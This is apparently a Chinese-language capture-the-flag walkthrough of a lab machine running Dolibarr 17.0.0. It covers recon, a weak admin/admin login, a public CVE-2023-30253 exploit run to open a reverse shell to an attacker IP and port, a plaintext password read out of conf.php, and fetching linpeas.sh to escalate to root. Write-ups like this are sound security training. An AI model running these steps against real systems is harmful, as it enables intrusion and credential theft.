
<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/00634a32-12b9-41ff-9384-5ce826e4e5b7" />

Nmap端口扫描
只开放了22和80端口

<img width="416" height="259" alt="image" src="https://github.com/user-attachments/assets/d52875d2-f081-4fa1-b03b-097ff061d161" />

访问web页面

<img width="416" height="259" alt="image" src="https://github.com/user-attachments/assets/7dd37b6d-248d-4cd7-afa0-3b0318df6f6b" />

将域名添加到etc/hosts文件里

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/567b16c8-9f45-4b8a-b01e-d1341bbfd444" />

<img width="415" height="411" alt="image" src="https://github.com/user-attachments/assets/ed59ee21-7c00-464e-a21e-9c6def254902" />

子域名爆破出crm.board.htb同样添加进去
访问crm.board.htb发现是一个登陆页面

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/b109ea35-b575-45b4-8aa4-ef5932d27182" />

版本号Dolibarr 17.0.0
上谷歌

<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/71667c8a-19d6-4ebc-826b-204247ad7074" />

初步判断是CVE-2023-30253

弱口令admin admin登陆进去看看
<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/e1825eca-9734-4d5d-8115-3ff9c2e60d0a" />

尝试文件上传
上传shell.jpg 然后抓包修改后缀为php
上传失败，无法利用
上EXP
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/2748a3de-c8b1-4209-af12-91efeb0f243e" />

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/557d4455-f697-42fa-9472-82bba8f6cf51" />

这个脚本参数就是
利用python3 启动脚本
域名，登陆的账号和密码 接上你要反弹shell的ip的端口
刚才已经弱口令知道了账号密码是admin admin
使用netcat监听端口

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/5ff4433f-31e8-4ffa-b743-2a781b4b65de" />

利用python3执行脚本


<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/530a408a-5f83-494e-bf78-02464d655956" />

python3 exploit.py http://crm.board.htb admin admin 10.10.16.18 3333
拿到shell

我们没有权限拿到userflag

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/5f1040ac-87e2-4272-9ac9-65e019844b46" />

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/3c39cbfa-d848-4b7d-b90e-0bc2958e64a3" />

这里准备尝试hash破解
但是shadow文件没有访问权限
直接上谷歌搜默认配置文件

<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/ffee28f8-afc6-4ca8-8df2-03f3c7b4d34b" />

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/7d3dc953-f50f-4318-b9f4-0f116439e595" />

直接来到htdocs/conf目录下面
Cat conf.php

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/6917ca4f-a394-41bb-88ec-22788ab8924a" />

尝试切换用户
larissa
serverfun2$2023!!

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/4b7f8db8-c526-4b6d-8d67-8c2762e70ebb" />

切换成功
python3 -c 'import pty; pty.spawn("/bin/bash")'
获得交互式shell

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/3b08bd42-870c-47df-ac9e-61f32c936a19" />

拿到第一个flag

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/0b418cf4-7c5c-497d-ac57-b594e3aac6c8" />

提权：
利用python3 -m 开启一个httpserver的端口
然后在目标机器上执行下载命令，来下载攻击急上的linpeas.sh信息收集脚本

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/82000ccf-0f12-4f04-a2c1-07ffdcb97725" />

Chomod +x 赋予执行权限

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/230c7ef3-b38e-4aee-90bf-b76158160b4c" />

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/0c7b84a9-d3c9-45f8-a0ef-dd14ddffd8e2" />

<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/d96c6250-f88e-4b8d-b999-7068a60bb701" />

再开一个端口，像刚才一样，下载这个文件

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/2053e448-ece6-4ae4-92a6-7ba7fca0f6a1" />

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/5dd922b3-e5ea-4173-9a43-a369f97422a2" />

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/d049e354-a021-4f69-93a0-146655600363" />

拿到rootflag

